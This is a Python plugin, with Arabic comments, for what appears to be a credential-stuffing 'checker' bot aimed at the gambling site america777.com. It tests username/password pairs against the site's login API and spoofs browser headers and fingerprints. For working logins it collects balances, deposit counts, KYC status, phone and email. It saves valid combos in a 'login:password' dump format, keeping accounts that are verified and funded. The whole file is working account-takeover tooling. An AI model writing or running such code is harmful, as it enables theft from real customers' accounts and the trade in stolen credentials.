from core.base_checker import BaseChecker
from typing import Dict, Any
import requests
import json

class America777Checker(BaseChecker):
    """America777 site checker"""
    
    # الروابط الرئيسية
    LOGIN_URL = "https://backoffice.america777.com/api/login"
    PROFILE_URL = "https://backoffice.america777.com/api/player/getProfile"
    KYC_URL = "https://backoffice.america777.com/api/kyc/kycStatus"
    
    # الهيدرات الأساسية
    HEADERS = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        'Content-Type': "application/json",
        'Accept': "application/json, text/plain, */*",
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': "?1",
        'sec-ch-ua-platform': '"Android"',
        'origin': "https://america777.com",
        'referer': "https://america777.com/",
        'accept-language': "en-US,en;q=0.9",
    }
    
    def generate_fingerprint(self):
        """توليد بصمة عشوائية"""
        import hashlib
        import random
        import string
        
        # توليد نص عشوائي
        random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
        return hashlib.md5(random_string.encode()).hexdigest()
    
    def check_account(self, username: str, password: str) -> Dict[str, Any]:
        """Check single America777 account"""
        try:
            session = requests.Session()
            session.headers.update(self.HEADERS)
            
            # 1. تسجيل الدخول
            payload = {
                "email": username,
                "password": password,
                "fingerprint": self.generate_fingerprint()
            }
            
            response = session.post(
                self.LOGIN_URL,
                json=payload,
                timeout=20
            )
            
            # 2. تحقق من الاستجابة
            if response.status_code != 200:
                return {"status": "bad", "username": username}
            
            data = response.json()
            
            # التحقق من نجاح تسجيل الدخول
            if not data.get("success", False):
                return {"status": "bad", "username": username}
            
            # 3. استخراج التوكن
            token = data.get("token", "")
            user_data = data.get("user", {})
            
            if not token:
                return {"status": "error", "username": username}
            
            # 4. تحديث الهيدرات بإضافة التوكن
            auth_headers = {
                'authorization': f'Bearer {token}',
                'x-requested-with': 'XMLHttpRequest',
            }
            session.headers.update(auth_headers)
            
            # 5. الحصول على معلومات إضافية من profile
            profile_response = session.get(self.PROFILE_URL, timeout=15)
            
            profile_data = {}
            if profile_response.status_code == 200:
                profile_json = profile_response.json()
                if profile_json.get("success"):
                    profile_data = profile_json.get("data", {})
            
            # 6. الحصول على حالة KYC
            kyc_response = session.post(
                self.KYC_URL,
                data="null",  # كما في الطلب الأصلي
                timeout=15
            )
            
            kyc_status = "unverified"
            if kyc_response.status_code == 200:
                kyc_json = kyc_response.json()
                if kyc_json.get("success"):
                    kyc_status = kyc_json.get("kyc_status", "unverified")
            
            # 7. استخراج البيانات المهمة
            # نستخدم user_data من login أولاً، ثم نحدثها من profile_data
            final_data = {**user_data, **profile_data}
            
            # استخراج الأرصدة
            total_balance = float(final_data.get("total_balance", 0))
            bonus_balance = float(final_data.get("bonus_balance", 0))
            balance = float(final_data.get("balance", 0))
            cashback = float(final_data.get("cashback", 0))
            deposit_count = int(final_data.get("deposit_count", 0))
            
            # تحديد ما إذا كان قد أودع من قبل
            has_deposited = deposit_count > 0
            
            # التحقق من KYC
            is_kyc_verified = kyc_status.lower() == "verified"
            
            # 8. رتب بيانات الحساب
            account_data = {
                "login": username,
                "password": password,
                "email": final_data.get("email", ""),
                "username": final_data.get("username", ""),
                "user_id": final_data.get("id", ""),
                "phone": final_data.get("phone", ""),
                "country": final_data.get("country", ""),
                "status": final_data.get("status", ""),
                "kyc_status": kyc_status,
                "is_kyc_verified": is_kyc_verified,
                "has_deposited": has_deposited,
                "deposit_count": deposit_count,
                "total_balance": total_balance,
                "bonus_balance": bonus_balance,
                "balance": balance,
                "cashback": cashback,
                "currency": final_data.get("currency", "USD"),
                "token": token,
                "created_at": final_data.get("created_at", ""),
            }
            
            return {
                "status": "valid",
                "account_data": account_data,
                "should_save": self.should_save(account_data)
            }
            
        except requests.exceptions.Timeout:
            return {"status": "error", "username": username, "error": "Timeout"}
        except requests.exceptions.ConnectionError:
            return {"status": "error", "username": username, "error": "Connection error"}
        except Exception as e:
            return {"status": "error", "username": username, "error": str(e)}
    
    def should_save(self, account_data: Dict[str, Any]) -> bool:
        """شروط حفظ الحساب"""
        # الشرط: KYC مفعل + تم الإيداع من قبل
        return (account_data.get("is_kyc_verified", False) and 
                account_data.get("has_deposited", False))
    
    def save_format(self, account_data: Dict[str, Any]) -> str:
        """تنسيق حفظ الحساب في الملف"""
        return f"{account_data['login']}:{account_data['password']} | " \
               f"email={account_data['email']} | " \
               f"username={account_data['username']} | " \
               f"kyc={account_data['kyc_status']} | " \
               f"deposited={account_data['has_deposited']} | " \
               f"deposit_count={account_data['deposit_count']} | " \
               f"total_balance=${account_data['total_balance']:.2f} | " \
               f"balance=${account_data['balance']:.2f} | " \
               f"bonus=${account_data['bonus_balance']:.2f} | " \
               f"country={account_data['country']} | " \
               f"phone={account_data.get('phone', '')}\n"
    
    def get_stats_keyboard(self, stats: Dict[str, int]) -> Dict[str, Any]:
        """تخصيص لوحة الإحصائيات"""
        return {
            "type": "inline_keyboard",
            "buttons": [
                [{"text": f"🔄 Checked: {stats['checked']}/{stats['total']}", "callback_data": "progress"}],
                [
                    {"text": f"✅ Valid: {stats['valid']}", "callback_data": "valid"},
                    {"text": f"❌ Bad: {stats['bad']}", "callback_data": "bad"}
                ],
                [
                    {"text": f"⚠️ Error: {stats['error']}", "callback_data": "error"},
                    {"text": f"🔒 KYC+Deposit: {stats['saved']}", "callback_data": "saved"}
                ]
            ]
        }